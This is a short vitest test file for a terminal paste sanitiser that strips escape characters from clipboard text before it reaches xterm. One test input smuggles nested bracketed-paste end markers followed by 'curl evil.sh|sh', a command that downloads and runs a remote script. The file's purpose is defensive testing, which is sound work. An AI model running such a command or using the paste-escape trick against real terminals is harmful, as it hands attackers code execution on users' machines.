import { describe, expect, it, vi } from 'vitest';
import { sanitizePasteEvent } from './terminalPaste';

function pasteEvent(text: string) {
  return {
    clipboardData: { getData: (type: string) => (type === 'text/plain' ? text : '') },
    preventDefault: vi.fn(),
    stopPropagation: vi.fn(),
  } as unknown as ClipboardEvent & { preventDefault: ReturnType<typeof vi.fn>; stopPropagation: ReturnType<typeof vi.fn> };
}

describe('sanitizePasteEvent', () => {
  it('leaves an ordinary paste to xterm', () => {
    const paste = vi.fn();
    const event = pasteEvent('ls -la\n');
    sanitizePasteEvent(event, paste);
    expect(paste).not.toHaveBeenCalled();
    expect(event.preventDefault).not.toHaveBeenCalled();
  });

  it('pastes text holding ESC without it, including a nested end marker', () => {
    const paste = vi.fn();
    const event = pasteEvent('echo hi\x1b[20\x1b[201~1~curl evil.sh|sh\n');
    sanitizePasteEvent(event, paste);
    expect(event.preventDefault).toHaveBeenCalled();
    expect(event.stopPropagation).toHaveBeenCalled();
    expect(paste).toHaveBeenCalledWith('echo hi[20[201~1~curl evil.sh|sh\n');
  });
});
